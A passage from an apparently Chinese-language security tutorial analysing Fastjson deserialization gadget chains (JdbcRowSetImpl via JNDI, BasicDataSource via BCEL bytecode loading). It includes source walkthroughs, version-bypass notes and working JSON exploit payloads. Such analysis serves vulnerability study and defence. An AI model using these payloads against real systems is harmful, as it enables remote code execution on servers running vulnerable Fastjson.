&#123;</span><br><span class="line">        <span class="keyword">return</span> s.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><blockquote>
<p><strong>≤ 1.2.24</strong>：AutoType 开，直接打。</p>
<p><strong>1.2.25−1.2.47</strong>：可用“<strong>两步&#x2F;缓存</strong>”绕过（<code>java.lang.Class</code> 先把 <code>JdbcRowSetImpl</code> 放进 mappings，再触发）——很多教程的“两次请求&#x2F;一次 JSON 两段”就是这个。</p>
</blockquote>
<p><code>com.sun.rowset.JdbcRowSetImpl</code> 是一个实现了 <code>javax.sql.rowset.JdbcRowSet</code> 接口的类，属于 <strong>JavaBeans</strong> 组件的一部分，用于在 Java 程序中管理和操作数据库数据。它提供了一种简化的方式来访问数据库，同时保持与 JDBC 的兼容性。</p>
<p><code>com.sun.rowset.JdbcRowSetImpl#setAutoCommit</code> 函数可以调用到 JNDI 的 <code>javax.naming.InitialContext#lookup</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为该 &lt;code&gt;JdbcRowSet&lt;/code&gt; 所使用的内部 &lt;code&gt;Connection&lt;/code&gt; 设置自动提交（auto-commit）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> autoCommit 是否开启自动提交</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SQLException 当发生数据库访问错误时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> autoCommit)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (conn != <span class="literal">null</span>) &#123; <span class="comment">// 📌 确保 conn 为空</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 走到这里说明当前连接对象为 null</span></span><br><span class="line">        <span class="comment">// 因为 JdbcRowSet 始终应当连接到数据库，这里内部创建一个连接句柄是合理的</span></span><br><span class="line">        conn = connect(); <span class="comment">// 👈 调用这个函数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 建立并返回一个 JDBC 连接。</span></span><br><span class="line"><span class="comment"> * 优先复用已有连接；否则按 dataSourceName（JNDI）或其他配置创建。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 可用的 Connection</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SQLException 获取连接失败时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 JDBC 连接</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (conn != <span class="literal">null</span>) &#123; <span class="comment">// 📌 确保 conn 为空</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过 JNDI 查找数据源并获取连接</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource) ctx.lookup(getDataSourceName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (javax.naming.NamingException ex) &#123;</span><br><span class="line">            <span class="comment">// 将命名异常包装为 SQL 异常，统一语义</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString(), ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getDataSourceName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> dataSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>上述代码要求：</p>
<ul>
<li><p><code>@type</code>：设置为 <code>com.sun.rowset.JdbcRowSetImpl</code>。</p>
</li>
<li><p><code>private Connection conn = null</code>，这个在 <code>JdbcRowSetImpl</code> 的无参构造函数中就能设置。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JdbcRowSetImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    conn = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>private String dataSource</code> 设置为 JNDI 的 URL，该字段有满足条件的 setter 函数可以设置该字段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.sun.rowset.JdbcRowSetImpl</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String dsName)</span> <span class="keyword">throws</span> SQLException&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!getDataSourceName().equals(dsName)) &#123;</span><br><span class="line">         <span class="built_in">super</span>.setDataSourceName(dsName);</span><br><span class="line">         conn = <span class="literal">null</span>;</span><br><span class="line">         ps = <span class="literal">null</span>;</span><br><span class="line">         rs = <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.setDataSourceName(dsName);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// javax.sql.rowset.BaseRowSet</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">        dataSource = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       dataSource = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    URL = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>JSNO 中有 <code>autoCommit</code> 字段确保触发 <code>setAutoCommit</code> 函数调用。</p>
</li>
</ul>
<p><strong>通过上述分析我们发现，<code>JdbcRowSetImpl</code> 的所有与利用相关的字段都可以保持默认或者通过 <code>public</code> 属性的 setter 函数设置，因此该利用链不需要启用 <code>Feature.SupportNonPublicField</code>。</strong></p>
<p>因此有如下 payload：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h2><blockquote>
<p>这条链最大优势：<strong>不出网</strong>、<strong>不需要 SupportNonPublicField</strong>。最大限制：<strong>版本与 JDK 约束苛刻</strong>。</p>
<ul>
<li><p><strong>Fastjson ≤ 1.2.24</strong>：AutoType 默认开，且 <code>checkAutoType</code> 尚未对 <code>ClassLoader</code>&#x2F;<code>DataSource</code> 做定向封堵 → 可打。</p>
</li>
<li><p>目标工程需有 <strong>dbcp&#x2F;tomcat-dbcp</strong>（类名在 Tomcat 8+ 为 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code>，更早为 <code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>）。</p>
</li>
<li><p>依赖 <strong>JRE 内置的 BCEL 内部类</strong>（<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>）。JDK 8u25x 以后对内置 BCEL 组件有<strong>移除&#x2F;调整</strong>（比如 <code>ClassLoaderRepository</code> 自 8u251 起缺失），<strong>实战普遍反馈 8u251+ 该链失效</strong>；稳妥窗口多选 <strong>JDK 8u241 及以下</strong>。</p>
</li>
</ul>
</blockquote>
<p><code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code> 是 <strong>JDBC 连接池</strong>。<br> 它实现了 <code>javax.sql.DataSource</code>，负责<strong>创建、复用与管理数据库连接</strong>（底层用的是 Apache Commons Pool2）。该组件来自 Tomcat，Maven 坐标如下：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.45<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>当 <code>BasicDataSource#getConnection </code> 被调用时会有如下调用链：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.bcel.internal.util.ClassLoader.loadClass(ClassLoader.java:131)</span><br><span class="line">at java.lang.ClassLoader.loadClass(ClassLoader.java:357)</span><br><span class="line">at java.lang.Class.forName0(Class.java:-1)</span><br><span class="line">at java.lang.Class.forName(Class.java:348)</span><br><span class="line">at org.apache.tomcat.dbcp.dbcp2.BasicDataSource.createConnectionFactory(BasicDataSource.java:2156)</span><br><span class="line">at org.apache.tomcat.dbcp.dbcp2.BasicDataSource.createDataSource(BasicDataSource.java:2061)</span><br><span class="line">at org.apache.tomcat.dbcp.dbcp2.BasicDataSource.getConnection(BasicDataSource.java:1543)</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>BasicDataSource#createConnectionFactory</code> 函数代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为当前数据源创建一个 JDBC 连接工厂。JDBC 驱动的加载遵循以下顺序：</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;如果通过 &#123;<span class="doctag">@link</span> #setDriver(Driver)&#125; 已显式设置 Driver 实例，则直接使用该实例。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;如果未设置 Driver 实例，且设置了 &#123;<span class="doctag">@link</span> #driverClassName&#125;，则优先使用当前类的 &#123;<span class="doctag">@link</span> ClassLoader&#125;</span></span><br><span class="line"><span class="comment"> *      （或若已设置 &#123;<span class="doctag">@link</span> #driverClassLoader&#125;，则使用该 ClassLoader）去加载 &#123;<span class="doctag">@link</span> #driverClassName&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若已指定 &#123;<span class="doctag">@link</span> #driverClassName&#125; 但上述尝试失败，则改用当前线程的上下文 ClassLoader 加载该类。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;如果仍未能加载到驱动，则基于给定的 &#123;<span class="doctag">@link</span> #url&#125;，通过 &#123;<span class="doctag">@link</span> DriverManager&#125; 获取一个已注册的驱动。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> * 该方法存在的目的，是为了便于子类替换具体实现类。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 连接工厂</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SQLException 创建连接工厂失败时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> ConnectionFactory <span class="title function_">createConnectionFactory</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="comment">// 1) 优先使用外部显式注入的 Driver 实例（如果存在）</span></span><br><span class="line">    <span class="type">Driver</span> <span class="variable">driverToUse</span> <span class="operator">=</span> <span class="built_in">this</span>.driver;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (driverToUse == <span class="literal">null</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; driverFromCCL = <span class="literal">null</span>; <span class="comment">// 记录通过指定类加载器加载到的 Driver 类（如果有）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 如果配置了驱动类名，尝试按既定的类加载顺序去加载驱动类</span></span><br><span class="line">        <span class="keyword">if</span> (driverClassName != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (driverClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 2.1 使用当前类的 ClassLoader 加载驱动类</span></span><br><span class="line">                        driverFromCCL = Class.forName(driverClassName);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// ✅ 2.2 如果指定了 driverClassLoader，则使用它加载驱动类</span></span><br><span class="line">                        driverFromCCL = Class.forName(driverClassName, <span class="literal">true</span>, driverClassLoader);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> ClassNotFoundException cnfe) &#123;</span><br><span class="line">                    <span class="comment">// 2.3 上述方式找不到时，退回到“线程上下文类加载器”加载</span></span><br><span class="line">                    driverFromCCL = Thread.currentThread()</span><br><span class="line">                            .getContextClassLoader()</span><br><span class="line">                            .loadClass(driverClassName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception t) &#123;</span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (driverFromCCL == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// ✅ 4) 如果我们是自己通过（上下文）ClassLoader 加载到的驱动类：</span></span><br><span class="line">                <span class="comment">//    不使用 DriverManager（它不一定尊重线程上下文 ClassLoader），而是反射创建实例并自行校验</span></span><br><span class="line">                driverToUse = (Driver) driverFromCCL.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception t) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>createConnectionFactory()</code> 的<strong>关键逻辑</strong>：</p>
<ul>
<li><p>如果设置了 <code>driverClassLoader</code>，就用这个类加载器加载 <code>driverClassName</code> 中的字节码，得到 <code>driverFromCCL</code> 类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driverFromCCL = Class.forName(driverClassName, <span class="literal">true</span>, driverClassLoader);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果 <code>driverFromCCL</code> 类成功加载，则反射调用该类的无参构造函数实例化成对象。</p>
</li>
</ul>
  <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driverToUse = (Driver) driverFromCCL.getConstructor().newInstance();</span><br></pre></td></tr></table></figure></div>

<p>因此如果我们将 <code>BasicDataSource</code> 中的字段设置成下面这种形式：</p>
<ul>
<li><code>driverClassLoader</code> 设成 **<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>**（JRE 内置 BCEL 类加载器）</li>
<li><code>driverClassName</code> 设成 **<code>&quot;$$BCEL$$&quot; + bcelCode</code>**。</li>
</ul>
<p>那么如果触发 <code>BasicDataSource#getConnection</code> 函数的调用就可以实现任意字节码加载。</p>
<blockquote>
<p><strong>普通的 <code>ClassLoader</code><strong>（比如应用的 AppClassLoader）接收的是</strong>类名</strong>，它会去<strong>classpath 上找 <code>.class</code> 文件</strong>或父加载器里找现成类；</p>
<p><strong>BCEL 的 <code>ClassLoader</code> 是一个“特殊类加载器”</strong>：<strong>当类名里包含 <code>$$BCEL$$</code> 子串时，它会把类名中携带的 BCEL 编码字节码取出来，解码后 <code>defineClass</code><strong>，等价于“</strong>把字节码塞在类名字符串里</strong>”完成动态加载。</p>
<p>因此这里我们需要通过 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 来实现任意字节码加载。</p>
</blockquote>
<p>然而 <code>getConnection</code> 的返回值类型为 <code>Connection</code>，<strong>不是容器&#x2F;Atomic</strong>，因此<strong>在反序列化阶段不会自动调用</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException;</span><br></pre></td></tr></table></figure></div>

<p>为了能够确保触发 <code>getConnection</code> 函数调用，我们需要像下面这样构造 payload：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$&lt;bcelCode&gt;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span> <span class="punctuation">:</span> <span class="string">&quot;bbb&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>当我们通过 <code>JSON.parse</code> 解析这段 payload 的时候：</p>
<ol>
<li><p>首先内层的 JSON 结构会被正常解析成一个 <code>JSONObject</code>。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$&lt;bcelCode&gt;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>之后解析外层 JSON 结构时发现之前解析的 JSON 结构（<code>&#123;&quot;aaa&quot;: &#123;...&#125;&#125;</code>）是外层 JSON 结构的一个键。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>...<span class="punctuation">&#125;</span><span class="punctuation">&#125;</span> <span class="punctuation">:</span> <span class="string">&quot;bbb&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>因此在 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code> 中会调用前面解析出来的 <code>JSONObject</code> 的 <code>toString</code> 方法将其转为字符串（这是因为 <code>JSONObject</code> 实现了 <code>Map&lt;String, Object&gt;</code> 接口，要序列化后键是字符串）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">// 循环遍历 object 的 key</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (object.getClass() == JSONObject.class) &#123;</span><br><span class="line">        <span class="comment">// 当前解析的 object 是 JSONObject</span></span><br><span class="line">        <span class="comment">// 📌 调用 key 的 toString 方法</span></span><br><span class="line">        key = (key == <span class="literal">null</span>) ? <span class="string">&quot;null&quot;</span> : key.toString(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>而 <code>JSONObject</code> 对象的 <code>toString</code> 方法实际上是调用 <code>toJSONString</code> 方法将其重新序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而根据前面的分析，<strong>FastJson 在序列化的时候，会递归分析调用内部所有对象的 getter 方法获取值</strong>，并且这里<strong>对 getter 方法返回值没有像反序列化那样严格要求</strong>。所以会调用到 <code>getConnection</code> 方法，有如下调用链：</p>
